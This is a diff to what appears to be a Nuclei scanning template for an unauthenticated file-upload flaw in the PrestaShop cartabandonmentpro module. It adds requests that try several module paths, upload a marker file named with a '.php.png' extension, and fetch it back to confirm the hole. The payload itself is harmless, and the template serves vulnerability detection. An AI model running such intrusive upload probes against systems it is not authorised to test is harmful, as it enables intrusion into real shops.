@@ -15,14 +15,17 @@ info:
     product: ap_pagebuilder
     vendor: apollotheme
   tags: intrusive,file-upload,cartabandonmentpro,prestashop
+
+flow: http(1) && http(2)
+
 variables:
   filename: '{{rand_base(7, "abc")}}'
-  title: '{{rand_base(7, "abc")}}'
+  string: '{{rand_base(7, "abc")}}'
 
 http:
   - raw:
       - |
-        POST /modules/cartabandonmentpro/upload.php HTTP/1.1
+        POST /modules/{{paths}}/upload.php HTTP/1.1
         Host: {{Hostname}}
         Content-Type: multipart/form-data; boundary=xYzZY
 
@@ -31,20 +34,48 @@ http:
         Content-Type: image/png
 
         <html>
-        <!-- {{title}} -->
+        <!-- {{string}} -->
         </html>
 
         --xYzZY--
 
+    payloads:
+      paths:
+        - 'cartabandonmentpro'
+        - 'cartabandonmentproOld'
+        - 'cartabandonmentpro_Old'
+        - 'cartabandonmentpro2'
+        - 'pscartabandonmentpro'
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(content_type, "text/html")'
+          - 'contains(body, "{{filename}}.php.png")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        internal: true
+        regex:
+          - '\/modules\/([^\/]+)\/'
+
+  - raw:
       - |
-        GET /modules/cartabandonmentpro/uploads/{{filename}}.php.png HTTP/1.1
+        GET {{matched_path}}uploads/{{filename}}.php.png HTTP/1.1
         Host: {{Hostname}}
 
     matchers:
       - type: dsl
         dsl:
-          - 'contains(header_2, "image/png")'
-          - 'contains(body_1, "{{filename}}.php.png")'
-          - 'status_code_1 == 200 && status_code_2 == 200'
+          - 'contains(content_type, "image/png")'
+          - 'contains(body, "{{string}}")'
+          - 'status_code == 200'
         condition: and
-# digest: 4b0a00483046022100a89b22a7b3f63fb2d18f0b621e3e1db4ade72c33a9c0694b3dca0fdb09547471022100a385c925ad87d2c2d39c822b028d25de5149a7e1bfdbeb29e9f752b3c729dd2e:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a004730450220427a2bd4285db3172e25282ea879424f5d2b33b1c7ce8466b8ef2fb6cfb3cc9f022100878a735dc3c5921b1a7377030825e0a0e74d388749889fcf454e96573a88ea54:922c64590222798bb761d5b6d8e72950
